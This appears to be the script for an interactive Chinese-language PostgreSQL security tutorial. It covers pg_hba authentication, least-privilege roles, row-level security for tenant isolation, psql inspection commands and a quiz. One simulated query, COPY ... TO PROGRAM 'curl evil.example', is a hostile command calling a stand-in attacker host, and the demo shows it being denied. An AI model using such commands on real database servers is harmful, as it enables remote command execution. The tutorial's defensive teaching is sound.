const P=(t,c='sig')=>({cls:'pill '+c,html:t});const B=(t,s,c='',w=150)=>({w,h:44,cls:'blk '+c,html:`${t}<br><span style="font-size:11px;opacity:.7">${s}</span>`});
const st=[['pg_hba.conf','hostssl shop api 10.0.0.0/16'],['认证','scram-sha-256'],['CONNECT','数据库 shop'],['USAGE','schema app'],['SELECT','表 app.orders'],['RLS 策略','tenant_id = 1']];
const e={q:P('api 从 10.0.3.7 执行 SELECT * FROM app.orders','sig'),ok:P('返回租户 1 的行','ok'),no:P('任何一层不满足：拒绝连接或 permission denied','bad')};st.forEach(([t,s],i)=>e['s'+i]=B(t,s,'',150));
const S=(n,c='ok')=>{const o={q:[0,0]};st.forEach((_,i)=>o['s'+i]=[(i%3)*170,50+Math.floor(i/3)*60,{cls:'blk '+(i<n?c:'mute')}]);return o};
Player(document.getElementById('p1'),{els:e,scenes:[
 {t:'连接',p:'先按 pg_hba.conf 自上而下找第一条匹配“连接类型、数据库、用户、来源地址”的规则，决定认证方式。',set:S(2)},
 {t:'对象权限',p:'登录后要有数据库的 CONNECT、schema 的 USAGE，以及表上对应操作的权限。权限可以通过角色继承获得。',d:4000,set:S(5)},
 {t:'行级过滤',p:'表开启了 RLS，策略的条件被自动加到查询上。查询本身没有写 WHERE，也只能看到自己租户的数据。',d:3800,set:{...S(6),ok:[0,180]}},
 {t:'层层把关',p:'每一层都是独立的防线。应用角色权限最小化，即使出现 SQL 注入，攻击者也拿不到超出这个角色的能力。',d:3800,set:{...S(6),no:[0,180]}}]});
const e2={t:{w:320,h:150,cls:'frame',html:'<i>app.orders</i>'},r1:B('id 1 · tenant 1','','',140),r2:B('id 2 · tenant 2','','',140),r3:B('id 3 · tenant 1','','',140),r4:B('id 4 · tenant 3','','',140),q:P('SELECT * FROM app.orders','sig'),a:P("SET LOCAL app.tenant_id = '1'",'mute'),b:P("SET LOCAL app.tenant_id = '2'",'mute'),w:P('INSERT tenant_id = 2（当前租户 1）→ 违反 WITH CHECK','bad'),o:P('表的所有者默认不受 RLS 限制：FORCE ROW LEVEL SECURITY','sig')};
const T={t:[0,0],r1:[10,30],r2:[160,30],r3:[10,85],r4:[160,85]};
Player(document.getElementById('p2'),{els:e2,scenes:[
 {t:'一张表，多个租户',p:'所有租户的数据在同一张表里，用 tenant_id 区分。',set:{...T,q:[350,0]}},
 {t:'租户 1',p:'应用在事务开头设置当前租户。同一条 SELECT 只返回 tenant 1 的行：策略条件被追加到了 WHERE。',d:4000,set:{...T,r1:[10,30,{cls:'blk ok'}],r3:[10,85,{cls:'blk ok'}],r2:[160,30,{cls:'blk mute'}],r4:[160,85,{cls:'blk mute'}],q:[350,0],a:[350,40]}},
 {t:'租户 2',p:'换一个租户，看到的是另一组行。应用代码不需要在每条 SQL 中自己加条件。',d:3800,set:{...T,r2:[160,30,{cls:'blk ok'}],r1:[10,30,{cls:'blk mute'}],r3:[10,85,{cls:'blk mute'}],r4:[160,85,{cls:'blk mute'}],q:[350,0],b:[350,40]}},
 {t:'写入检查',p:'WITH CHECK 限制写入和更新后的行也必须属于当前租户。注意：所有者和 BYPASSRLS 角色不受影响，应用不能用它们连接。',d:4200,set:{...T,w:[0,170],o:[0,210]}}]});
(()=>{const Q=[['SELECT * FROM app.orders','RLS 开启，app.tenant_id = 1\n\n id | tenant_id | …\n----+-----------+\n  1 |         1 |\n  3 |         1 |','ok','app_rw 有 SELECT 权限，RLS 过滤。'],
['DELETE FROM app.orders WHERE id = 2','DELETE 0','ok','没有报错，但删除了 0 行：tenant 2 的行对它不可见。RLS 对 UPDATE/DELETE 同样生效。'],
['DROP TABLE app.orders','ERROR:  must be owner of table orders','ok','只有所有者（app_owner）能 DROP/ALTER。应用凭据泄露也删不了表。'],
['CREATE TABLE app.tmp (x int)','ERROR:  permission denied for schema app','ok','没有 schema 的 CREATE 权限。'],
["COPY (SELECT 1) TO PROGRAM 'curl evil.example'",'ERROR:  permission denied to COPY to or from an external program\nDETAIL:  Only roles with privileges of the "pg_execute_server_program" role may COPY to or from an external program.','ok','如果用超级用户连接，这一条就能在数据库服务器上执行任意命令。'],
['SELECT * FROM pg_shadow','ERROR:  permission denied for view pg_shadow','ok','密码哈希只有超级用户能读。'],
['SET app.tenant_id = \'2\'; SELECT * FROM app.orders','可以执行，返回 tenant 2 的行','bad','会话变量谁都能设置：RLS 防的是应用漏写条件，而不是被完全控制的应用。如果需要防止被注入的 SQL 切换租户，应为每个租户使用独立的数据库角色（策略用 current_user），或由可信的 SECURITY DEFINER 函数设置并校验。'],
['SELECT * FROM app.new_table（app_owner 刚建的表）','若已执行 ALTER DEFAULT PRIVILEGES FOR ROLE app_owner …：成功\n否则：ERROR:  permission denied for table new_table','sig','默认权限只对之后由指定角色创建的对象生效，并且要以创建者的名义设置（FOR ROLE app_owner）。']];
 const q=document.getElementById('hq'),p=document.getElementById('hp'),m=document.getElementById('hm');
 Q.forEach(([t],i)=>{const b=document.createElement('button');b.className='btn';b.textContent=t;b.addEventListener('click',()=>{q.querySelectorAll('.btn').forEach(x=>x.classList.toggle('pri',x===b));p.textContent='api=> '+Q[i][0]+';\n\n'+Q[i][1];m.className='msg '+Q[i][2];m.innerHTML=Q[i][3]});q.appendChild(b)});
 m.className='msg';m.innerHTML='api 继承 app_rw；app.orders 由 app_owner 拥有并开启了 RLS；当前 app.tenant_id = 1。'})();
Term(document.getElementById('t4'),[
['\\du','                    List of roles\n Role name |                         Attributes\n-----------+------------------------------------------------------------\n analyst   |\n api       |\n app_owner | Cannot login\n postgres  | Superuser, Create role, Create DB, Replication, Bypass RLS','角色及属性。'],
['\\dp app.*','                          Access privileges\n Schema | Name  | Type  |       Access privileges        | … | Policies\n--------+-------+-------+--------------------------------+---+----------\n app    | notes | table | app_owner=arwdDxtm/app_owner  +|   | tenant_isolation:\n        |       |       | app_rw=arwd/app_owner         +|   |\n        |       |       | app_ro=r/app_owner             |   |','r=SELECT a=INSERT w=UPDATE d=DELETE D=TRUNCATE x=REFERENCES t=TRIGGER m=MAINTAIN。'],
['SELECT has_table_privilege(\'api\', \'app.notes\', \'DELETE\');',' has_table_privilege\n---------------------\n t','检查某角色是否有某权限。'],
['SELECT type, database, user_name, address, auth_method FROM pg_hba_file_rules;','  type   | database | user_name |  address   | auth_method\n---------+----------+-----------+------------+---------------\n local   | {all}    | {all}     |            | peer\n hostssl | {shop}   | {api}     | 10.0.0.0   | scram-sha-256','当前生效的 pg_hba 规则（含语法错误提示）。'],
['SELECT usename, ssl, version, cipher FROM pg_stat_ssl JOIN pg_stat_activity USING (pid);',' usename | ssl | version |         cipher\n---------+-----+---------+------------------------\n api     | t   | TLSv1.3 | TLS_AES_256_GCM_SHA384','哪些连接用了 TLS。'],
['REVOKE ALL ON DATABASE shop FROM PUBLIC; GRANT CONNECT ON DATABASE shop TO app_rw, app_ro;','REVOKE\nGRANT','默认所有角色都能连接任何数据库，收紧它。']]);
Quiz(document.getElementById('qs'),[
['应用连接数据库应使用？',['超级用户','表的所有者','只有所需权限的角色'],2,''],
['ALTER DEFAULT PRIVILEGES 影响？',['已有的表','之后新建的对象','所有角色'],1,''],
['推荐的密码认证方式？',['md5','scram-sha-256','trust'],1,''],
['表的所有者默认受 RLS 限制吗？',['受','不受，需要 FORCE ROW LEVEL SECURITY','只受 SELECT 限制'],1,''],
['RLS 策略的 WITH CHECK 用于？',['过滤读取','限制写入的新行','检查索引'],1,'']]);
